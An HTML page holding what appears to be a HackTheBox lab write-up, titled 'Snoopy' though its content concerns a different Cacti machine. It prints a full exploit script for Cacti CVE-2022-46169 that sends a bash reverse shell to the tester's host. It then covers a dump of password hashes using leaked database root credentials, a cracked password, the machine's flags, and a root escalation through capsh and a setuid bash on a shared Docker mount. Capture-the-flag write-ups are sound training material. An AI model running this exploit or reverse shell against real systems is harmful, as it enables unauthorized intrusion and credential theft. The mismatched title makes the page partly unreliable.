<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> HackTheBox Machine Writeup</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <h1> Snoopy - Linux (Hard) </h1>
        <nav>
            <ul>
                <li><a href="index.html">Home</a></li>
                <li><a href="Snoopy.html">Writeups</a></li>
            </ul>
        </nav>
    </header>
    <main>
        <pre>
            <code>
                ---

---

### User access:

Nmap has given us port 80 and port 22 to work with

On port 80 is cacti running, and we found the exploit that can be used as below

---

---

### Exploitation

GitHub PoC
https://raw.githubusercontent.com/ariyaadinatha/cacti-cve-2022-46169-exploit/main/cacti.py

```php
┌─[htb-yougotgot@htb-qnjdgdrcsz]─[~]
└──╼ $cat cacti.py 
import requests
import urllib.parse

def checkVuln():
    result = requests.get(vulnURL, headers=header)
    return (result.text != "FATAL: You are not authorized to use this service" and result.status_code == 200)

def bruteForce():
    # brute force to find host id and local data id
    for i in range(1, 5):
        for j in range(1, 10):
            vulnIdURL = f"{vulnURL}?action=polldata&poller_id=1&host_id={i}&local_data_ids[]={j}"
            result = requests.get(vulnIdURL, headers=header)
    
            if result.text != "[]":
                # print(result.text)
                rrdName = result.json()[0]["rrd_name"]
                if rrdName == "polling_time" or rrdName == "uptime":
                    return True, i, j

    return False, -1, -1

def remoteCodeExecution(payload, idHost, idLocal):
    encodedPayload = urllib.parse.quote(payload)
    injectedURL = f"{vulnURL}?action=polldata&poller_id=;{encodedPayload}&host_id={idHost}&local_data_ids[]={idLocal}"
    
    result = requests.get(injectedURL,headers=header)
    print(result.text)

if __name__ == "__main__":
    targetURL = "http://10.129.217.106:80"
    vulnURL = f"{targetURL}/remote_agent.php"
    # X-Forwarded-For value should be something in the database of Cacti
    header = {"X-Forwarded-For": "127.0.0.1"}
    print("Checking vulnerability...")
    if checkVuln():
        print("App is vulnerable")
        isVuln, idHost, idLocal = bruteForce()
        print("Brute forcing id...")
        # RCE payload
        ipAddress = "10.129.217.106"
        port = "80"
        payload = f"bash -c 'bash -i >& /dev/tcp/10.10.14.129/4444 0>&1'"
        if isVuln:
            print("Delivering payload...")
            remoteCodeExecution(payload, idHost, idLocal)
        else:
            print("RRD not found")
    else:
        print("Not vulnerable")
```

Found the entrypoint.sh

```php
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi
chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
```

If we run this command we can access the DB and have all the tables:
`mysql --host=db --user=root --password=root cacti -e "show tables”`

One of the interesting tables is user_auth, so we can dump it 

`mysql --host=db --user=root --password=root cacti -e “SELECT * from user_auth”`

```php
www-data@50bca5e748b0:/$ mysql --host=db --user=root --password=root cacti -e "SELECT * from user_auth"
< --password=root cacti -e "SELECT * from user_auth"
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	11	1	on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1	00	0
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	1	1	11	1	on	-1	-1		on	0	0	2135691668
```

Using hashcat to crack marcus hash

`$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C`

`hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt`

And we have a password: funkymonkey

### marcus: funkymonkey

### user.txt: 53868f3e3bd27824b9f90933700d7407

---

---

### Privilege escalation

Transferred over linpeas

And have it running

Maybe try with pspy64 also and see all the processes that are running..

Maybe there is a privilege with the docker container that we can use to our advantage

find / -name docker.sock 2>/dev/null

Ports 

```php
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:39181         0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -

tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -

tcp6       0      0 :::80                   :::*                    LISTEN      -

tcp6       0      0 :::22                   :::*                    LISTEN      -
```

```php
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/sbin/runc
/usr/bin/sudo
/usr/bin/wget
```

marcus@monitorstwo:/tmp$ nc -nv 127.0.0.1 80
Connection to 127.0.0.1 80 port [tcp/*] succeeded!
GET / HTTP/1.139117.0
HOST: localhost

Docker interface

docker0: flags=4099ctr <UP,BROADCAST,MULTICAST>  mtu 1500
inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
ether 02:42:5b:ee:98:81  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 0  bytes 0 (0.0 B)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

Going back to the shell where is the docker container and after running linpeas, we discover capsh and we can explot that in the following way using GTFOBins

[capsh
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/capsh/)

We navigate to the /usr/sbin directory and from there execute the following

`capsh --gid=0 --uid=0 --`

We are root now inside of the docker container..

What can we do now. Let’s see and list the volumes from the user machine and see if there are some shared with the docker

`df`

`foundmnt`

Looking through and inspecting each we discover that `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/ is shared with Marcus`

Now what we could do and what we learned is possible is to transfer the /bin/bash over to marcus and use that to our advantage to run root commands in the following way:

`cd /var/www/html` 

`rm *`

`cp /bin/bash .`

`chown root:root bash`

`chmod u+s bash`

Now if we navigate to marcus we can see the bash binary

```php
marcus@monitorstwo:/tmp$ ls -la /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/var/www/html
total 1364
drwxrwxrwx 1 www-data www-data    4096 May  2 14:48 .
drwxr-xr-x 1 root     root        4096 Nov 15 04:13 ..
-rw-rw-r-- 1 www-data www-data     577 Aug 14  2022 .mdl_style.rb
-rw-rw-r-- 1 www-data www-data      60 Aug 14  2022 .mdlrc
-rw------- 1 www-data www-data    1024 Jan  5 11:39 .rnd
-rwsr-xr-x 1 root     root     1234376 May  2 14:48 bash
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 cache
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 cli
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 docs
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 formats
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 images
drwxrwxr-x 1 www-data www-data    4096 Dec 12 12:31 include
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 install
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 lib
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 locales
drwxrwxr-x 1 www-data www-data    4096 Jan  5 11:39 log
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 mibs
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 plugins
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 resource
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 rra
drwxrwxr-x 1 www-data www-data    4096 Jan  5 11:39 scripts
drwxrwxr-x 1 www-data www-data    4096 Aug 14  2022 service
```

So if we execute

`/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/var/www/html/bash -p`

We get our privileges elevated and we are root!

### root.txt: 15962f6367e363fb96879b71ebad9da5

---

---

---
            </code>
        </pre><!-- Add machine details here -->
    </main>
    <footer>
        <p>© 2022 HackTheBox Machines and Writeups</p>
    </footer>
</body>
</html>
